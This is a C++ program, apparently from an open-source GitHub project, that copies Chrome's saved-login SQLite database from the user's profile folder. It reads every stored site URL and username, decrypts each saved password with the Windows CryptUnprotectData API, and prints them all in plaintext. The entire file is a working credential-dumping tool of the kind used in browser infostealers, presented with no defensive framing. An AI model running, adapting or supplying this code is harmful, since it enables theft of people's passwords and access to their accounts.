/*
	Author: Adnan Alhomssi
	URL: https://github.com/adnanonline/chrome-passwords
	License: GNU GPL V3
*/
#include "stdafx.h"

using namespace std;

const char* tempFile = "copydb"; //name of the local copy of Chrome Password manager sqlite3 db
stringstream dump(string("")); // String stream for our output
/*
** Pass sqlite3 handler, iterate over queried rows and decrypt each password by copying bytes from password_value 
** column to DATA_BLOB data structure which is convient for Win32API CryptUnprotectData function
*/
int getPass(
	sqlite3 *db
) {
	const char *zSql = "SELECT action_url, username_value, password_value FROM logins";
	sqlite3_stmt *pStmt;
	int rc;

	/* Compile the SELECT statement into a virtual machine. */
	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		cout << "statement failed rc = " << rc << endl;
		return rc;
	}
	cout << "statement prepared " << endl;

	/* So call sqlite3_step() once
	** only. Normally, we would keep calling sqlite3_step until it
	** returned something other than SQLITE_ROW.
	*/
	rc = sqlite3_step(pStmt);
	cout << "RC: " << rc << endl;
	while (rc == SQLITE_ROW) {
		dump << sqlite3_column_text(pStmt, 0) << endl;
		dump << (char *)sqlite3_column_text(pStmt, 1) << endl;

		DATA_BLOB encryptedPass, decryptedPass;

		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
		encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

		CryptUnprotectData(
			&encryptedPass, // In Data
			NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
			NULL,           // Optional entropy
			NULL,           // Reserved
			NULL,           // Here, the optional
							// prompt structure is not
							// used.
			0,
			&decryptedPass);
		char *c = (char *)decryptedPass.pbData;
		while (isprint(*c)) {
			dump << *c;
			c++;
		}
		dump << endl;
		rc = sqlite3_step(pStmt);
	}

	/* Finalize the statement (this releases resources allocated by
	** sqlite3_prepare() ).
	*/
	rc = sqlite3_finalize(pStmt);

	return rc;
}

int main(int argc, char **argv)
{
	int rc;
	// Open Database
	cout << "Copying db ..." << endl;
	sqlite3 *db;
	
	//Form path for Chrome's Login Data 
	string path = getenv("LOCALAPPDATA");
	path.append("\\Google\\Chrome\\User Data\\Default\\Login Data");
	//copy the sqlite3 db from chrome directory 
	//as we are not allowed to open it directly from there (chrome could also be running)
	ifstream  src(path, std::ios::binary);
	ofstream  dst(tempFile, std::ios::binary);
	dst << src.rdbuf();
	dst.close();
	src.close();

	cout << "Path = " << path.c_str() << endl;
	rc = sqlite3_open(tempFile, &db);
	if (rc)
	{
		cerr << "Error opening SQLite3 database: " << sqlite3_errmsg(db) << endl << endl;
		sqlite3_close(db);
		return 1;
	}
	else
	{
		cout << "DB Opened." << endl << endl;
	}

	cout << "Start Query..." << endl;

	getPass(db);
	cout << dump.str();
	
	if (sqlite3_close(db) == SQLITE_OK)
		cout << "DB connection closed properly" << endl;
	else
		cout << "Failed to close DB connection" << endl;
	
	if (remove(tempFile) != 0)
		cout << "Could not delete temp clone." << endl;
	else
		cout << "Temp DB Clone deleted... Bye bye" << endl;
	cin.get();
	return 0;
}